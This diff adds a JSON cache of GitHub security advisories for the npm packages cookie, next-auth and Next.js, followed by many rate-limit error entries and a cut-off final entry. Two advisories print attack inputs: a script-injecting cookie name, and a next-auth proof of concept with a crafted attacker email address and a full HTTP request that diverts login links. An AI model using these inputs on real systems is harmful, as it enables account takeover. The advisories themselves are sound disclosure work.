@@ -1,0 +1,978 @@
+[
+  {
+    "id": "GHSA-pxg6-pf52-xh8x",
+    "fetchedAt": "2026-10-04T17:59:13.340Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-pxg6-pf52-xh8x",
+      "cve_id": "CVE-2024-47764",
+      "url": "https://api.github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "html_url": "https://github.com/advisories/GHSA-pxg6-pf52-xh8x",
+      "summary": "cookie accepts cookie name, path, and domain with out of bounds characters",
+      "description": "### Impact\n\nThe cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. For example, `serialize(\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a\", value)` would result in `\"userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test\"`, setting `userName` cookie to `<script>` and ignoring `value`.\n\nA similar escape can be used for `path` and `domain`, which could be abused to alter other fields of the cookie.\n\n### Patches\n\nUpgrade to 0.7.0, which updates the validation for `name`, `path`, and `domain`.\n\n### Workarounds\n\nAvoid passing untrusted or arbitrary values for these fields, ensure they are set by the application instead of user input.\n\n### References\n\n* https://github.com/jshttp/cookie/pull/167",
+      "type": "reviewed",
+      "severity": "low",
+      "repository_advisory_url": "https://api.github.com/repos/jshttp/cookie/security-advisories/GHSA-pxg6-pf52-xh8x",
+      "source_code_location": "https://github.com/jshttp/cookie",
+      "identifiers": [
+        {
+          "value": "GHSA-pxg6-pf52-xh8x",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2024-47764",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/jshttp/cookie/security/advisories/GHSA-pxg6-pf52-xh8x",
+        "https://github.com/jshttp/cookie/pull/167",
+        "https://github.com/jshttp/cookie/commit/e10042845354fea83bd8f34af72475eed1dadf5c",
+        "https://github.com/advisories/GHSA-pxg6-pf52-xh8x"
+      ],
+      "published_at": "2024-10-04T20:31:00Z",
+      "updated_at": "2025-04-15T13:56:44Z",
+      "github_reviewed_at": "2024-10-04T20:31:00Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "cookie"
+          },
+          "vulnerable_version_range": "< 0.7.0",
+          "first_patched_version": "0.7.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-74",
+          "name": "Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "bewinsnw",
+            "id": 119598239,
+            "node_id": "U_kgDOByDsnw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/119598239?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/bewinsnw",
+            "html_url": "https://github.com/bewinsnw",
+            "followers_url": "https://api.github.com/users/bewinsnw/followers",
+            "following_url": "https://api.github.com/users/bewinsnw/following{/other_user}",
+            "gists_url": "https://api.github.com/users/bewinsnw/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/bewinsnw/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/bewinsnw/subscriptions",
+            "organizations_url": "https://api.github.com/users/bewinsnw/orgs",
+            "repos_url": "https://api.github.com/users/bewinsnw/repos",
+            "events_url": "https://api.github.com/users/bewinsnw/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/bewinsnw/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "analyst"
+        }
+      ],
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00744,
+        "percentile": 0.52606
+      }
+    }
+  },
+  {
+    "id": "GHSA-5jpx-9hw9-2fx4",
+    "fetchedAt": "2026-10-04T17:59:13.314Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-5jpx-9hw9-2fx4",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-5jpx-9hw9-2fx4",
+      "html_url": "https://github.com/advisories/GHSA-5jpx-9hw9-2fx4",
+      "summary": "NextAuthjs Email misdelivery Vulnerability",
+      "description": "### Summary\n\nNextAuth.js's email sign-in can be forced to deliver authentication emails to an attacker-controlled mailbox due to a bug in `nodemailer`'s address parser used by the project (fixed in `nodemailer` **v7.0.7**). A crafted input such as:\n\n```\n\"e@attacker.com\"@victim.com\n```\n\nis parsed incorrectly and results in the message being delivered to `e@attacker.com` (attacker) instead of `\"<e@attacker.com>@victim.com\"` (the intended recipient at `victim.com`) in violation of RFC 5321/5322 semantics. This allows an attacker to receive login/verification links or other sensitive emails intended for the victim.\n\n<h2>Affected NextAuthjs Version</h2>\n\n≤ Version | Afftected\n-- | --\n4.24.11 | Yes\n5.0.0-beta.29 | Yes\n\n\n## POC\n\nExample Setup showing misdelivery of email \n\n```jsx\nimport NextAuth from \"next-auth\"\nimport Nodemailer from \"next-auth/providers/nodemailer\"\nimport { PrismaAdapter } from \"@auth/prisma-adapter\"\nimport { prisma } from \"@/lib/prisma\"\n\nexport const { handlers, auth, signIn, signOut } = NextAuth({\n  adapter: PrismaAdapter(prisma),\n  providers: [\n    Nodemailer({\n      server: {\n        host: \"127.0.0.1\",\n        port: 1025,\n        ...\n      },\n      from: \"noreply@authjs.dev\",\n    }),\n  ],\n  pages: {\n    signIn: '/auth/signin',\n    verifyRequest: '/auth/verify-request',\n  },\n})\n\n```\n\n```jsx\nPOST /api/auth/signin/nodemailer HTTP/1.1\nAccept-Encoding: gzip, deflate, br, zstd\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 176\nDNT: 1\nHost: localhost:3000\nOrigin: http://localhost:3000\nPragma: no-cache\nReferer: http://localhost:3000/auth/signin\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36\naccept: */*\naccept-language: en-US,en;q=0.9,ta;q=0.8\ncontent-type: application/x-www-form-urlencoded\nsec-ch-ua: \"Google Chrome\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Linux\"\nx-auth-return-redirect: 1\n\nemail=%22e%40attacker.coccm%22%40victim.com&csrfToken=90f5e6f48ab577ab011f212011862dcfe546459c23764cf891aab2d176f8d77a&callbackUrl=http%3A%2F%2Flocalhost%3A3000%2Fauth%2Fsignin\n```\n\n<img width=\"1247\" height=\"1408\" alt=\"Screenshot from 2025-10-25 21-15-25\" src=\"https://github.com/user-attachments/assets/456968a3-14ce-42b4-b8ca-f25b9351cf0f\" />\n<img width=\"1279\" height=\"1450\" alt=\"Screenshot from 2025-10-25 21-14-47\" src=\"https://github.com/user-attachments/assets/4e665b66-9bfe-43ce-abd3-97880972218f\" />\n\n# Mitigation\n\nUpdate to nodemailer 7.0.7\n\n## Credits\n\nhttps://zeropath.com/  Helped identify this security issue",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/nextauthjs/next-auth/security-advisories/GHSA-5jpx-9hw9-2fx4",
+      "source_code_location": "https://github.com/nextauthjs/next-auth",
+      "identifiers": [
+        {
+          "value": "GHSA-5jpx-9hw9-2fx4",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/nextauthjs/next-auth/security/advisories/GHSA-5jpx-9hw9-2fx4",
+        "https://github.com/nextauthjs/next-auth/commit/82efcf81f218aae43683f8dd2f7c260ef69b3ece",
+        "https://github.com/nextauthjs/next-auth/commit/8f3b2c7af0fe08973a12f616517c3ec85a5cd172",
+        "https://github.com/advisories/GHSA-5jpx-9hw9-2fx4"
+      ],
+      "published_at": "2025-10-29T10:43:57Z",
+      "updated_at": "2025-10-29T10:43:59Z",
+      "github_reviewed_at": "2025-10-29T10:43:57Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next-auth"
+          },
+          "vulnerable_version_range": "< 4.24.12",
+          "first_patched_version": "4.24.12",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next-auth"
+          },
+          "vulnerable_version_range": ">= 5.0.0-beta.0, < 5.0.0-beta.30",
+          "first_patched_version": "5.0.0-beta.30",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-200",
+          "name": "Exposure of Sensitive Information to an Unauthorized Actor"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "rootxjs",
+            "id": 45196752,
+            "node_id": "MDQ6VXNlcjQ1MTk2NzUy",
+            "avatar_url": "https://avatars.githubusercontent.com/u/45196752?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/rootxjs",
+            "html_url": "https://github.com/rootxjs",
+            "followers_url": "https://api.github.com/users/rootxjs/followers",
+            "following_url": "https://api.github.com/users/rootxjs/following{/other_user}",
+            "gists_url": "https://api.github.com/users/rootxjs/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/rootxjs/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/rootxjs/subscriptions",
+            "organizations_url": "https://api.github.com/users/rootxjs/orgs",
+            "repos_url": "https://api.github.com/users/rootxjs/repos",
+            "events_url": "https://api.github.com/users/rootxjs/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/rootxjs/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    }
+  },
+  {
+    "id": "GHSA-9g9p-9gw9-jx7f",
+    "fetchedAt": "2026-10-04T17:59:13.314Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-9g9p-9gw9-jx7f",
+      "cve_id": "CVE-2025-59471",
+      "url": "https://api.github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "html_url": "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f",
+      "summary": "Next.js self-hosted applications vulnerable to DoS via Image Optimizer remotePatterns configuration",
+      "description": "A DoS vulnerability exists in self-hosted Next.js applications that have `remotePatterns` configured for the Image Optimizer. The image optimization endpoint (`/_next/image`) loads external images entirely into memory without enforcing a maximum size limit, allowing an attacker to cause out-of-memory conditions by requesting optimization of arbitrarily large images. This vulnerability requires that `remotePatterns` is configured to allow image optimization from external domains and that the attacker can serve or control a large image on an allowed domain.\n\nStrongly consider upgrading to 15.5.10 and 16.1.5 to reduce risk and prevent availability issues in Next applications.",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/vercel/next.js/security-advisories/GHSA-9g9p-9gw9-jx7f",
+      "source_code_location": "https://github.com/vercel/next.js",
+      "identifiers": [
+        {
+          "value": "GHSA-9g9p-9gw9-jx7f",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2025-59471",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/vercel/next.js/security/advisories/GHSA-9g9p-9gw9-jx7f",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-59471",
+        "https://github.com/vercel/next.js/commit/500ec83743639addceaede95e95913398975156c",
+        "https://github.com/vercel/next.js/commit/e5b834d208fe0edf64aa26b5d76dcf6a176500ec",
+        "https://github.com/vercel/next.js/releases/tag/v15.5.10",
+        "https://github.com/vercel/next.js/releases/tag/v16.1.5",
+        "https://github.com/advisories/GHSA-9g9p-9gw9-jx7f"
+      ],
+      "published_at": "2026-01-27T19:18:25Z",
+      "updated_at": "2026-01-27T19:18:28Z",
+      "github_reviewed_at": "2026-01-27T19:18:25Z",
+      "nvd_published_at": "2026-01-26T22:15:52Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 10.0.0, < 15.5.10",
+          "first_patched_version": "15.5.10",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.6.0-canary.0, < 16.1.5",
+          "first_patched_version": "16.1.5",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 5.9
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "credits": [],
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 5.9
+      },
+      "epss": {
+        "percentage": 0.00495,
+        "percentile": 0.39792
+      }
+    }
+  },
+  {
+    "id": "GHSA-h25m-26qc-wcjf",
+    "fetchedAt": "2026-10-04T17:59:13.312Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-h25m-26qc-wcjf",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "html_url": "https://github.com/advisories/GHSA-h25m-26qc-wcjf",
+      "summary": "Next.js HTTP request deserialization can lead to DoS when using insecure React Server Components",
+      "description": "A vulnerability affects certain React Server Components packages for versions 19.0.x, 19.1.x, and 19.2.x and frameworks that use the affected packages, including Next.js 13.x, 14.x, 15.x, and 16.x using the App Router. The issue is tracked upstream as [CVE-2026-23864](https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg).\n\nA specially crafted HTTP request can be sent to any App Router Server Function endpoint that, when deserialized, may trigger excessive CPU usage, out-of-memory exceptions, or server crashes. This can result in denial of service in unpatched environments.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/vercel/next.js/security-advisories/GHSA-h25m-26qc-wcjf",
+      "source_code_location": "https://github.com/vercel/next.js",
+      "identifiers": [
+        {
+          "value": "GHSA-h25m-26qc-wcjf",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/facebook/react/security/advisories/GHSA-83fc-fqcc-2hmg",
+        "https://github.com/vercel/next.js/security/advisories/GHSA-h25m-26qc-wcjf",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-23864",
+        "https://vercel.com/changelog/summary-of-cve-2026-23864",
+        "https://github.com/advisories/GHSA-h25m-26qc-wcjf"
+      ],
+      "published_at": "2026-01-28T15:38:01Z",
+      "updated_at": "2026-01-28T15:38:02Z",
+      "github_reviewed_at": "2026-01-28T15:38:01Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 13.0.0, < 15.0.8",
+          "first_patched_version": "15.0.8",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.1.1-canary.0, < 15.1.12",
+          "first_patched_version": "15.1.12",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.2.0-canary.0, < 15.2.9",
+          "first_patched_version": "15.2.9",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.3.0-canary.0, < 15.3.9",
+          "first_patched_version": "15.3.9",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.4.0-canary.0, < 15.4.11",
+          "first_patched_version": "15.4.11",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.5.1-canary.0, < 15.5.10",
+          "first_patched_version": "15.5.10",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 15.6.0-canary.0, < 15.6.0-canary.61",
+          "first_patched_version": "15.6.0-canary.61",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 16.0.0-beta.0, < 16.0.11",
+          "first_patched_version": "16.0.11",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 16.1.0-canary.0, < 16.1.5",
+          "first_patched_version": "16.1.5",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        },
+        {
+          "cwe_id": "CWE-502",
+          "name": "Deserialization of Untrusted Data"
+        }
+      ],
+      "credits": [],
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      }
+    }
+  },
+  {
+    "id": "GHSA-ggv3-7p47-pfv8",
+    "fetchedAt": "2026-10-04T17:59:13.314Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-ggv3-7p47-pfv8",
+      "cve_id": "CVE-2026-29057",
+      "url": "https://api.github.com/advisories/GHSA-ggv3-7p47-pfv8",
+      "html_url": "https://github.com/advisories/GHSA-ggv3-7p47-pfv8",
+      "summary": "Next.js: HTTP request smuggling in rewrites",
+      "description": "## Summary\nWhen Next.js rewrites proxy traffic to an external backend, a crafted `DELETE`/`OPTIONS` request using `Transfer-Encoding: chunked` could trigger request boundary disagreement between the proxy and backend. This could allow request smuggling through rewritten routes.\n\n## Impact\nAn attacker could smuggle a second request to unintended backend routes (for example, internal/admin endpoints), bypassing assumptions that only the configured rewrite destination/path is reachable. This does not impact applications hosted on providers that handle rewrites at the CDN level, such as Vercel. \n\n## Patches\nThe vulnerability originated in an upstream library vendored by Next.js. It is fixed by updating that dependency’s behavior so `content-length: 0` is added only when both `content-length` and `transfer-encoding` are absent, and `transfer-encoding` is no longer removed in that code path.\n\n## Workarounds\nIf upgrade is not immediately possible:\n- Block chunked `DELETE`/`OPTIONS` requests on rewritten routes at your edge/proxy.\n- Enforce authentication/authorization on backend routes per our [security guidance](https://nextjs.org/docs/app/guides/data-security).",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/vercel/next.js/security-advisories/GHSA-ggv3-7p47-pfv8",
+      "source_code_location": "https://github.com/vercel/next.js",
+      "identifiers": [
+        {
+          "value": "GHSA-ggv3-7p47-pfv8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-29057",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/vercel/next.js/security/advisories/GHSA-ggv3-7p47-pfv8",
+        "https://github.com/vercel/next.js/commit/dc98c04f376c6a1df76ec3e0a2d07edf4abdabd6",
+        "https://github.com/vercel/next.js/releases/tag/v15.5.13",
+        "https://github.com/vercel/next.js/releases/tag/v16.1.7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-29057",
+        "https://github.com/advisories/GHSA-ggv3-7p47-pfv8"
+      ],
+      "published_at": "2026-03-17T16:17:15Z",
+      "updated_at": "2026-03-18T21:53:30Z",
+      "github_reviewed_at": "2026-03-17T16:17:15Z",
+      "nvd_published_at": "2026-03-18T01:16:05Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 16.0.0-beta.0, < 16.1.7",
+          "first_patched_version": "16.1.7",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 9.5.0, < 15.5.13",
+          "first_patched_version": "15.5.13",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.3
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-444",
+          "name": "Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling')"
+        }
+      ],
+      "credits": [],
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00525,
+        "percentile": 0.42513
+      }
+    }
+  },
+  {
+    "id": "GHSA-3x4c-7xq6-9pq8",
+    "fetchedAt": "2026-10-04T17:59:13.324Z",
+    "status": 200,
+    "data": {
+      "ghsa_id": "GHSA-3x4c-7xq6-9pq8",
+      "cve_id": "CVE-2026-27980",
+      "url": "https://api.github.com/advisories/GHSA-3x4c-7xq6-9pq8",
+      "html_url": "https://github.com/advisories/GHSA-3x4c-7xq6-9pq8",
+      "summary": "Next.js: Unbounded next/image disk cache growth can exhaust storage",
+      "description": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service. Note that this does not impact platforms that have their own image optimization capabilities, such as Vercel.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/vercel/next.js/security-advisories/GHSA-3x4c-7xq6-9pq8",
+      "source_code_location": "https://github.com/vercel/next.js",
+      "identifiers": [
+        {
+          "value": "GHSA-3x4c-7xq6-9pq8",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-27980",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/vercel/next.js/security/advisories/GHSA-3x4c-7xq6-9pq8",
+        "https://github.com/vercel/next.js/commit/39eb8e0ac498b48855a0430fbf4c22276a73b4bd",
+        "https://github.com/vercel/next.js/releases/tag/v16.1.7",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-27980",
+        "https://github.com/advisories/GHSA-3x4c-7xq6-9pq8"
+      ],
+      "published_at": "2026-03-17T16:17:06Z",
+      "updated_at": "2026-03-19T18:33:25Z",
+      "github_reviewed_at": "2026-03-17T16:17:06Z",
+      "nvd_published_at": "2026-03-18T01:16:04Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 16.0.0-beta.0, < 16.1.7",
+          "first_patched_version": "16.1.7",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "next"
+          },
+          "vulnerable_version_range": ">= 10.0.0, < 15.5.14",
+          "first_patched_version": "15.5.14",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-400",
+          "name": "Uncontrolled Resource Consumption"
+        }
+      ],
+      "credits": [],
+      "comments": 1,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00841,
+        "percentile": 0.56044
+      }
+    }
+  },
+  {
+    "id": "GHSA-q4gf-8mx6-v5v3",
+    "fetchedAt": "2026-10-04T17:59:13.445Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-qx2v-qp2m-jg93",
+    "fetchedAt": "2026-10-04T17:59:13.433Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-gh4j-gqv2-49f6",
+    "fetchedAt": "2026-10-04T17:59:13.445Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-8h8q-6873-q5fj",
+    "fetchedAt": "2026-10-04T17:59:13.442Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-3g8h-86w9-wvmq",
+    "fetchedAt": "2026-10-04T17:59:13.432Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-ffhc-5mcf-pf4q",
+    "fetchedAt": "2026-10-04T17:59:13.444Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-vfv6-92ff-j949",
+    "fetchedAt": "2026-10-04T17:59:13.553Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-gx5p-jg67-6x7h",
+    "fetchedAt": "2026-10-04T17:59:13.543Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-h64f-5h5j-jqjh",
+    "fetchedAt": "2026-10-04T17:59:13.548Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-c4j6-fc7j-m34r",
+    "fetchedAt": "2026-10-04T17:59:13.539Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-wfc6-r584-vfw7",
+    "fetchedAt": "2026-10-04T17:59:13.550Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-36qx-fr4f-26g5",
+    "fetchedAt": "2026-10-04T17:59:13.728Z",
+    "status": 403,
+    "data": {
+      "message": "API rate limit exceeded for 79.134.40.13. (But here's the good news: Authenticated requests get a higher rate limit. Check out the documentation for more details.)",
+      "documentation_url": "https://docs.github.com/rest/overview/resources-in-the-rest-api#rate-limiting"
+    }
+  },
+  {
+    "id": "GHSA-5wm8-gmm8-39j9",
+    "fetchedAt": "2026-10-04T17:59:13.833Z",
+    "status": 403,
+    "data": {
